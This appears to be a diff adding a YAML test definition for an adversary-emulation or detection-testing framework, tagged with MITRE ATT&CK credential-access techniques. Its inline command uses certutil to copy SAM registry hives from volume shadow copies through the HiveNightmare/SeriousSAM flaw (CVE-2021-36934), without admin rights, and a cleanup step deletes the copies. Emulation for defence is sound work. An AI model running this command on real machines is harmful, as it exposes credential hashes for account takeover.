@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: dump volume shadow copy hives with certutil
+description: |
+    Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as "HiveNightmare" or "SeriousSAM".
+    This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+args:
+    - name: target_hive
+      type: string
+      default: SAM
+    - name: limit
+      type: integer
+      default: "10"
+uuid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.002: Security Account Manager'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: dump-volume-shadow-copy-hives-with-certutil
+      inline: |
+        for /L %a in (1,1,{{.Args.limit}}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\{{.Args.target_hive}}" %temp%\{{.Args.target_hive}}vss%a 2 >nul 2>&1) & dir /B %temp%\{{.Args.target_hive}}vss*
+      executor: command_prompt
+      cleanup:
+        inline: |
+            for /L %a in (1,1,{{.Args.limit}}) do @(del %temp%\{{.Args.target_hive}}vss%a >nul 2>&1)
+        executor: command_prompt
